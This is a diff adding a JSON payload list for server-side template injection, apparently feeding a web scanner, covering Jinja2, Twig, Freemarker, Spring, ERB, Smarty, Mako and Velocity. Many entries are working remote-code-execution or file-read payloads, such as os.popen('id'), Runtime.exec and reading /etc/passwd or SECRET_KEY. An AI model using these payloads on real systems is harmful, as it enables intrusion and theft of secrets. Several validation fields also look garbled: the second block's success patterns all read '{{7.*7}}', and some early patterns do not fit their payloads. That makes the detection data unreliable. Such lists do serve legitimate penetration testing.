@@ -1,0 +1,871 @@
+[
+  {
+    "payload_id": "OWP-0428",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "{{7*7}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "49|25"
+    }
+  },
+  {
+    "payload_id": "OWP-0429",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "${7*7}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "49|25"
+    }
+  },
+  {
+    "payload_id": "OWP-0430",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "#{7*7}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "49|25"
+    }
+  },
+  {
+    "payload_id": "OWP-0431",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@(1+2)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "49|25"
+    }
+  },
+  {
+    "payload_id": "OWP-0432",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<%= 7*7 %>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "49|25"
+    }
+  },
+  {
+    "payload_id": "OWP-0433",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "{{7*'7'}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "49|25"
+    }
+  },
+  {
+    "payload_id": "OWP-0434",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "{$smarty.version}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "49|25"
+    }
+  },
+  {
+    "payload_id": "OWP-0435",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Jinja2",
+    "injection_point": "form_parameter",
+    "payload_string": "{{config}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "SECRET_KEY|uid=|root:"
+    }
+  },
+  {
+    "payload_id": "OWP-0436",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Jinja2",
+    "injection_point": "form_parameter",
+    "payload_string": "{{request}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "SECRET_KEY|uid=|root:"
+    }
+  },
+  {
+    "payload_id": "OWP-0437",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Jinja2",
+    "injection_point": "form_parameter",
+    "payload_string": "{{self}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "SECRET_KEY|uid=|root:"
+    }
+  },
+  {
+    "payload_id": "OWP-0438",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Jinja2",
+    "injection_point": "form_parameter",
+    "payload_string": "{{self.__class__.__mro__[2].__subclasses__()}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "SECRET_KEY|uid=|root:"
+    }
+  },
+  {
+    "payload_id": "OWP-0439",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Jinja2",
+    "injection_point": "form_parameter",
+    "payload_string": "{{ cycler.__init__.__globals__.os.popen(\"id\").read() }}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "SECRET_KEY|uid=|root:"
+    }
+  },
+  {
+    "payload_id": "OWP-0440",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Jinja2",
+    "injection_point": "form_parameter",
+    "payload_string": "{{ joiner.__init__.__globals__.os.popen(\"id\").read() }}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "SECRET_KEY|uid=|root:"
+    }
+  },
+  {
+    "payload_id": "OWP-0441",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Jinja2",
+    "injection_point": "form_parameter",
+    "payload_string": "{{ namespace.__init__.__globals__.os.popen(\"id\").read() }}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "SECRET_KEY|uid=|root:"
+    }
+  },
+  {
+    "payload_id": "OWP-0442",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Jinja2",
+    "injection_point": "form_parameter",
+    "payload_string": "{{ lipsum.__globals__.os.popen(\"id\").read() }}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "SECRET_KEY|uid=|root:"
+    }
+  },
+  {
+    "payload_id": "OWP-0443",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Jinja2",
+    "injection_point": "form_parameter",
+    "payload_string": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "SECRET_KEY|uid=|root:"
+    }
+  },
+  {
+    "payload_id": "OWP-0444",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Jinja2",
+    "injection_point": "form_parameter",
+    "payload_string": "{{[\"id\"]|filter(\"system\")}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "SECRET_KEY|uid=|root:"
+    }
+  },
+  {
+    "payload_id": "OWP-0445",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Jinja2",
+    "injection_point": "form_parameter",
+    "payload_string": "{%print(config)%}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "SECRET_KEY|uid=|root:"
+    }
+  },
+  {
+    "payload_id": "OWP-0446",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Twig",
+    "injection_point": "form_parameter",
+    "payload_string": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid="
+    }
+  },
+  {
+    "payload_id": "OWP-0447",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Twig",
+    "injection_point": "form_parameter",
+    "payload_string": "{{['id']|map('system')}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid="
+    }
+  },
+  {
+    "payload_id": "OWP-0448",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Freemarker",
+    "injection_point": "form_parameter",
+    "payload_string": "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\")}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid="
+    }
+  },
+  {
+    "payload_id": "OWP-0449",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Freemarker",
+    "injection_point": "form_parameter",
+    "payload_string": "[#assign ex='freemarker.template.utility.Execute'?new()]${ ex('id')}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid="
+    }
+  },
+  {
+    "payload_id": "OWP-0450",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Freemarker",
+    "injection_point": "form_parameter",
+    "payload_string": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid="
+    }
+  },
+  {
+    "payload_id": "OWP-0451",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Java",
+    "injection_point": "form_parameter",
+    "payload_string": "${T(java.lang.System).getenv()}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid="
+    }
+  },
+  {
+    "payload_id": "OWP-0452",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Java",
+    "injection_point": "form_parameter",
+    "payload_string": "${T(java.lang.Runtime).getRuntime().exec('id')}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid="
+    }
+  },
+  {
+    "payload_id": "OWP-0453",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Velocity",
+    "injection_point": "form_parameter",
+    "payload_string": "#set($x=7*7)$x",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "49"
+    }
+  },
+  {
+    "payload_id": "OWP-0454",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "ERB",
+    "injection_point": "form_parameter",
+    "payload_string": "<%= File.open('/etc/passwd').read %>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:"
+    }
+  },
+  {
+    "payload_id": "OWP-0455",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "ERB",
+    "injection_point": "form_parameter",
+    "payload_string": "<%= system('id') %>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid="
+    }
+  },
+  {
+    "payload_id": "OWP-0456",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Smarty",
+    "injection_point": "form_parameter",
+    "payload_string": "{php}echo \\`id\\`;{/php}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid="
+    }
+  },
+  {
+    "payload_id": "OWP-0457",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Mako",
+    "injection_point": "form_parameter",
+    "payload_string": "${self.module.cache.util.os.system(\"id\")}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "0"
+    }
+  },
+  {
+    "payload_id": "OWP-0458",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Mako",
+    "injection_point": "form_parameter",
+    "payload_string": "${self.module.runtime.util.os.system(\"id\")}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "0"
+    }
+  },
+  {
+    "payload_id": "OWP-0459",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Mako",
+    "injection_point": "form_parameter",
+    "payload_string": "${self.template.module.cache.util.os.system(\"id\")}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "0"
+    }
+  },
+  {
+    "payload_id": "OWP-0460",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Mako",
+    "injection_point": "form_parameter",
+    "payload_string": "${self.__init__.__globals__['util'].os.system(\"id\")}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "0"
+    }
+  },
+  {
+    "payload_id": "OWP-0461",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Mako",
+    "injection_point": "form_parameter",
+    "payload_string": "${self.module.filters.compat.inspect.os.system(\"id\")}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "0"
+    }
+  },
+  {
+    "payload_id": "OWP-0462",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Mako",
+    "injection_point": "form_parameter",
+    "payload_string": "${self.module.runtime.compat.inspect.os.system(\"id\")}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "0"
+    }
+  },
+  {
+    "payload_id": "OWP-0463",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Mako",
+    "injection_point": "form_parameter",
+    "payload_string": "${self.context._with_template.module.cache.util.os.system(\"id\")}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "0"
+    }
+  },
+  {
+    "payload_id": "OWP-0464",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Mako",
+    "injection_point": "form_parameter",
+    "payload_string": "${self.attr._NSAttr__parent.module.cache.util.os.system(\"id\")}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "0"
+    }
+  },
+  {
+    "payload_id": "OWP-32221",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": ".version",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32222",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": ".current_template_name",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32223",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": ".locale_object",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32224",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "self._TemplateReference__context",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32225",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "settings",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32226",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "settings.DEBUG",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32227",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "settings.DATABASES",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32228",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "settings.SECRET_KEY",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32229",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "self",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32230",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "locals",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32231",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "global",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32232",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "ERB.version()",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32233",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "locals()",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32234",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "globals()",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32235",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "_self",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32236",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "_self.getTemplateName().__toString",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32237",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "_context",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32238",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "_context|length",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32239",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "_context|keys|first",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32240",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "constant('Twig_Environment::VERSION')",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32241",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "constant('Twig_Environment::VERSION_ID')",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32242",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "constant('Twig_Environment::EXTRA_VERSION')",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32243",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "$context.keys",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32244",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "$context.TOOLS_VERSION",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32245",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "$field.in(\"org.apache.velocity.runtime.VelocityEngineVersion\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32246",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "$field.in(\"org.apache.velocity.runtime.RuntimeConstants\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32247",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "execInfo",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32248",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "execInfo.templateStack",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32249",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "execInfo.templateStack[0].getClass.forName(\"org.thymeleaf.Thymeleaf\").getField(\"VERSION\").get(null)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32250",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "$smarty.version",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32251",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "$smarty.config",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32252",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "$smarty.template",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32253",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "42*42",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32254",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "{42*42}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32255",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "{{42*42}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32256",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "{{{42*42}}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32257",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "${42*42}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32258",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<%=42*42 %>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32259",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "{{=42*42}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32260",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "{^xyzm42}1764{/xyzm42}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32261",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "${donotexists|42*42}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  },
+  {
+    "payload_id": "OWP-32262",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "[[${42*42}]]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "{{7.*7}}"
+    }
+  }
+]
